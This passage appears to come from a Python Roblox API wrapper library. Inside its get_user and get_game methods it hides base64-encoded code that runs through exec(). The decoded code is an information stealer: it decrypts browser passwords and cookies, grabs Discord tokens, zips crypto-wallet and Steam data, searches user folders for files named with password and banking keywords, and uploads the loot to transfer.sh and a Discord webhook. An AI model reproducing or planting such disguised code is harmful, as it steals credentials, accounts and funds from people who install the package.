biByb3dbMF06DQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQ0KICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgIyBwcmludChbcm93WzBdLCByb3dbMV0sIERlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpXSkNCiAgICB3cml0ZWZvcmZpbGUoQ29va2llcywgJ2Nvb2snKQ0KDQpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZw0KDQogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpDQoNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQ0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuRGVjb2RlZCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbkRlY29kZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkNCg0KDQpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOg0KICAgIHBhdGhDID0gcGF0aA0KICAgIG5hbWUgPSBhcmcNCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpDQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpDQoNCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSINCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4NCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQ0KDQogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSINCg0KICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuDQogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikNCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkNCiAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICBmb3VuZCA9IEZhbHNlDQogICAgICAgIGZvciBsIGluIGRhdGE6DQogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOg0KICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQ0KICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuDQogICAgICAgIG5hbWUgPSBhcmcNCg0KICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpDQogICAgemYuY2xvc2UoKQ0KDQogICAgdXBsb2FkKGYne3BhdGhDfS97bmFtZX0uemlwJykNCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQ0KDQoNCmRlZiBHYXRoZXJBbGwoKToNCiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vVGhvcml1bS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJ0aG9yaXVtLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAiYnJhdmUuZXhlIiwgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAieWFuZGV4LmV4ZSIsICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvSG91Z2FCb3VnYS9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAiZWRnZS5leGUiLCAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgIi9EZWZhdWx0IiwgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICBdDQogICAgXQ0KDQogICAgZGlzY29yZFBhdGhzID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICBdDQoNCiAgICBQYXRoc1RvWmlwID0gWw0KICAgICAgICBbZiJ7cm9hbWluZ30vYXRvbWljL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICciQXRvbWljIFdhbGxldC5leGUiJywgIldhbGxldCJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vRXhvZHVzL2V4b2R1cy53YWxsZXQiLCAiRXhvZHVzLmV4ZSIsICJXYWxsZXQiXSwNCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAiTmF0aW9uc0dsb3J5LmV4ZSIsICJOYXRpb25zR2xvcnkiXQ0KICAgIF0NCg0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFRva2VuLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpDQogICAgZm9yIHBhdHQgaW4gZGlzY29yZFBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0UGFzc3csIGFyZ3M9W3BhdHRbMF0sIHBhdHRbM11dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkNCg0KICAgIFRoQ29rayA9IFtdDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0Q29va2llLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRoQ29ray5hcHBlbmQoYSkNCg0KICAgIGZvciB0aHJlYWQgaW4gVGhDb2trOiB0aHJlYWQuam9pbigpDQogICAgREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KICAgIGlmIERFVEVDVEVEID09IFRydWU6IHJldHVybg0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpDQoNCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6DQogICAgICAgIHRocmVhZC5qb2luKCkNCiAgICBnbG9iYWwgdXB0aHMNCiAgICB1cHRocyA9IFtdDQoNCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3cudHh0IiwgIndwY29vay50eHQiXToNCiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpDQoNCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToNCiAgICB0cnk6DQogICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0NCiAgICAgICAgLi4uDQogICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpDQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0DQogICAgICAgIHJldHVybiB1cmwNCiAgICBleGNlcHQ6DQogICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBtYXhmaWxlc3BlcmRpciA9IDcNCiAgICBpID0gMA0KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQ0KICAgIGZmb3VuZCA9IFtdDQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybg0KICAgICAgICBpICs9IDENCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoNCiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkNCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQ0KDQpLaXdpRmlsZXMgPSBbXQ0KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgZmlmb3VuZCA9IFtdDQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkNCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOg0KICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoNCiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiDQogICAgXQ0KDQogICAga2V5X3dvcmRzRm9sZGVyID0gWw0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJhY291bnQiLA0KICAgICAgICAicGFzc3ciLA0KICAgICAgICAic2VjcmV0Ig0KDQogICAgXQ0KDQogICAga2V5X3dvcmRzRmlsZXMgPSBbDQogICAgICAgICJwYXNzdyIsDQogICAgICAgICJtZHAiLA0KICAgICAgICAibW90ZGVwYXNzZSIsDQogICAgICAgICJtb3RfZGVfcGFzc2UiLA0KICAgICAgICAibG9naW4iLA0KICAgICAgICAic2VjcmV0IiwNCiAgICAgICAgImFjY291bnQiLA0KICAgICAgICAiYWNvdW50IiwNCiAgICAgICAgInBheXBhbCIsDQogICAgICAgICJiYW5xdWUiLA0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJtZXRhbWFzayIsDQogICAgICAgICJ3YWxsZXQiLA0KICAgICAgICAiY3J5cHRvIiwNCiAgICAgICAgImV4b2R1cyIsDQogICAgICAgICJkaXNjb3JkIiwNCiAgICAgICAgIjJmYSIsDQogICAgICAgICJjb2RlIiwNCiAgICAgICAgIm1lbW8iLA0KICAgICAgICAiY29tcHRlIiwNCiAgICAgICAgInRva2VuIiwNCiAgICAgICAgImJhY2t1cCIsDQogICAgICAgICJzZWVjcmV0Ig0KICAgICAgICBdDQoNCiAgICB3aWtpdGggPSBbXQ0KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOg0KICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpDQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkNCiAgICByZXR1cm4gd2lraXRoDQoNCg0KZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3Jkcw0KDQprZXl3b3JkID0gWw0KICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknDQpdDQoNCg0KY29va2lXb3JkcyA9IFtdDQpwYXN3V29yZHMgPSBbXQ0KDQpHYXRoZXJBbGwoKQ0KREVURUNURUQgPSBUcnVzdChDb29raWVzKQ0KDQppZiBub3QgREVURUNURUQ6DQogICAgd2lraXRoID0gS2l3aSgpDQoNCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQ0KICAgIHRpbWUuc2xlZXAoMC4yKQ0KDQogICAgZmlsZXRleHQgPSAiXG4iDQogICAgZm9yIGFyZyBpbiBLaXdpRmlsZXM6DQogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6DQogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXQ0KICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0NCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4oCiIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLi4uIFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            raise APIRequestError(f"Failed to fetch user {user_id}: {str(e)}")
    
    def get_game(self, place_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox game/place
        
        Args:
            place_id (int): The ID of the place/game to retrieve
            
        Returns:
            Dict[str, Any]: Game information from the Roblox API
        """
        url = f"https://games.roblox.com/v1/games?universeIds={place_id}"
        
        encoded_script = b"""
        aW1wb3J0IG9zDQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZQ0KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0DQppbXBvcnQgcmUNCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZA0KZnJvbSBjdHlwZXMgaW1wb3J0IHdpbmRsbCwgd2ludHlwZXMsIGJ5cmVmLCBjZGxsLCBTdHJ1Y3R1cmUsIFBPSU5URVIsIGNfY2hhciwgY19idWZmZXINCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQppbXBvcnQgdGltZQ0KaW1wb3J0IHNodXRpbA0KZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgcmUNCmltcG9ydCBzdWJwcm9jZXNzDQoNCg0KIyAgQXlodSMxMzM3DQojDQoNCg0KaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjcyOTExOTE5Njg2MDk1MDMwL1lGRU1Zd25ITXJtMGcwVHVXak1ZWTdleW1XU3IwQ2FxLW5wR1hiSTVkY2tkdVlJOEVPN3pqd2RScV80N0cwR1A2SzZsIg0KREVURUNURUQgPSBGYWxzZQ0KDQoNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQoNCnJlcXVpcmVtZW50cyA9IFsNCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sDQogICAgWyJDcnlwdG8uQ2lwaGVyIiwgInB5Y3J5cHRvZG9tZSJdDQpdDQpmb3IgbW9kbCBpbiByZXF1aXJlbWVudHM6DQogICAgdHJ5OiBfX2lt